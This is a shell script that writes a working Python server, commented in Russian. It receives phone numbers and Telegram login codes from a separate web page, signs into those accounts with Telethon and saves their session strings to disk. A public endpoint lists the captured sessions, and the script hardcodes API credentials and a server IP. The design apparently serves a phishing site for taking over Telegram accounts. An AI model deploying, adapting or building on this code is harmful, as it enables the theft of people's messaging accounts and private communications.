cat > /root/server.py << 'EOF'
#!/usr/bin/env python3
"""
Настоящий сервер для создания Telegram сессий
Принимает номер с сайта -> ждет код -> создает сессию
"""
import asyncio
import json
import random
import string
import os
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# Пытаемся импортировать telethon
try:
    from telethon import TelegramClient, TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
    TELETHON_AVAILABLE = True
except ImportError:
    print("Устанавливаем Telethon...")
    os.system("pip3 install telethon > /dev/null 2>&1")
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
        TELETHON_AVAILABLE = True
    except:
        TELETHON_AVAILABLE = False
        print("Telethon не установился. Демо-режим.")

# Telegram API
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"

# Хранилище
pending_auths = {}  # session_id -> {phone, phone_code_hash, client}
active_sessions = {}  # session_id -> client
PORT = 5000

def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")

async def create_telegram_client():
    """Создает клиент Telegram"""
    if not TELETHON_AVAILABLE:
        return None
    return TelegramClient(StringSession(), API_ID, API_HASH)

async def start_telegram_auth(phone):
    """Начинает авторизацию в Telegram"""
    if not TELETHON_AVAILABLE:
        return {"status": "error", "message": "Telethon not installed"}
    
    try:
        phone = ''.join([c for c in phone if c.isdigit()])
        if not phone.startswith('7') and not phone.startswith('8'):
            phone = '7' + phone
        
        # Создаем ID сессии
        session_id = ''.join(random.choices(string.digits + string.ascii_lowercase, k=16))
        
        # Создаем клиент
        client = await create_telegram_client()
        await client.connect()
        
        # Запрашиваем код
        sent_code = await client.send_code_request(phone)
        
        # Сохраняем данные
        pending_auths[session_id] = {
            'phone': phone,
            'phone_code_hash': sent_code.phone_code_hash,
            'client': client,
            'timestamp': datetime.now().isoformat()
        }
        
        log(f"📱 Код отправлен на {phone} (сессия: {session_id})")
        
        return {
            "status": "success",
            "session_id": session_id,
            "message": f"Код отправлен на {phone}"
        }
        
    except Exception as e:
        log(f"Ошибка Telegram: {str(e)}")
        return {"status": "error", "message": str(e)}

async def verify_telegram_code(session_id, code):
    """Проверяет код и создает сессию"""
    if session_id not in pending_auths:
        return {"status": "error", "message": "Неверная сессия"}
    
    session_data = pending_auths[session_id]
    client = session_data['client']
    phone = session_data['phone']
    
    try:
        # Входим с кодом
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=session_data['phone_code_hash']
        )
        
        # Получаем строку сессии
        session_string = await client.session.save()
        
        # Сохраняем в файл
        os.makedirs('/root/telegram_sessions', exist_ok=True)
        filename = f"/root/telegram_sessions/{phone}_{session_id}.session"
        
        with open(filename, 'w') as f:
            f.write(session_string)
        
        # Отключаемся
        await client.disconnect()
        
        # Удаляем из ожидания
        del pending_auths[session_id]
        
        log(f"✅ Сессия создана: {filename}")
        
        return {
            "status": "success",
            "message": "Сессия создана успешно!",
            "session_file": filename,
            "phone": phone,
            "session_string": session_string[:50] + "..."  # Первые 50 символов
        }
        
    except PhoneCodeInvalidError:
        return {"status": "error", "message": "Неверный код"}
    except PhoneCodeExpiredError:
        return {"status": "error", "message": "Код устарел"}
    except SessionPasswordNeededError:
        return {"status": "error", "message": "Нужен пароль 2FA"}
    except Exception as e:
        log(f"Ошибка входа: {str(e)}")
        return {"status": "error", "message": f"Ошибка: {str(e)}"}

# HTTP сервер
class TelegramHandler(BaseHTTPRequestHandler):
    
    def _cors_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
    
    def do_OPTIONS(self):
        self.send_response(200)
        self._cors_headers()
        self.end_headers()
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            # Простейшая HTML страница для теста
            html = '''
            <html><body>
                <h1>Telegram Session Server</h1>
                <p>Status: ONLINE</p>
                <p>Use your HTML site to connect to this API</p>
                <p>Endpoints:</p>
                <ul>
                    <li>POST /auth/start - Start auth with phone</li>
                    <li>POST /auth/code - Verify code</li>
                    <li>GET /status - Server status</li>
                </ul>
            </body></html>
            '''
            self.wfile.write(html.encode())
            
        elif self.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            status = {
                "status": "online",
                "server": "Telegram Session Creator",
                "telethon": TELETHON_AVAILABLE,
                "pending_auths": len(pending_auths),
                "time": datetime.now().isoformat(),
                "port": PORT
            }
            self.wfile.write(json.dumps(status, indent=2).encode())
        
        elif self.path == '/sessions':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            sessions_list = []
            if os.path.exists('/root/telegram_sessions'):
                for f in os.listdir('/root/telegram_sessions'):
                    if f.endswith('.session'):
                        sessions_list.append(f)
            
            self.wfile.write(json.dumps({"sessions": sessions_list}).encode())
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        # Читаем тело
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except:
            data = {}
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self._cors_headers()
        self.end_headers()
        
        # Запускаем асинхронные операции
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        if self.path == '/auth/start':
            phone = data.get('phone', '')
            
            if not phone:
                response = {"status": "error", "message": "Phone required"}
            else:
                response = loop.run_until_complete(start_telegram_auth(phone))
            
            self.wfile.write(json.dumps(response).encode())
        
        elif self.path == '/auth/code':
            session_id = data.get('session_id', '')
            code = data.get('code', '')
            
            if not session_id or not code:
                response = {"status": "error", "message": "Session ID and code required"}
            else:
                response = loop.run_until_complete(verify_telegram_code(session_id, code))
            
            self.wfile.write(json.dumps(response).encode())
        
        else:
            self.wfile.write(json.dumps({"status": "error", "message": "Not found"}).encode())
        
        loop.close()
    
    def log_message(self, format, *args):
        pass

def main():
    print("="*60)
    print("TELEGRAM SESSION SERVER")
    print("="*60)
    print(f"Port: {PORT}")
    print(f"URL: http://188.225.11.61:{PORT}")
    print(f"Telethon: {'✅' if TELETHON_AVAILABLE else '❌ (demo mode)'}")
    print("")
    print("API Endpoints:")
    print("  POST /auth/start - Send phone number")
    print("  POST /auth/code  - Verify Telegram code")
    print("  GET  /status     - Server status")
    print("  GET  /sessions   - List created sessions")
    print("")
    print("Sessions saved to: /root/telegram_sessions/")
    print("="*60)
    
    # Создаем папку для сессий
    os.makedirs('/root/telegram_sessions', exist_ok=True)
    
    # Запускаем сервер
    server = HTTPServer(('0.0.0.0', PORT), TelegramHandler)
    
    try:
        log("Server started successfully!")
        server.serve_forever()
    except KeyboardInterrupt:
        log("Server stopped")
        server.server_close()

if __name__ == '__main__':
    main()
EOF

# Даем права
chmod +x /root/server.py
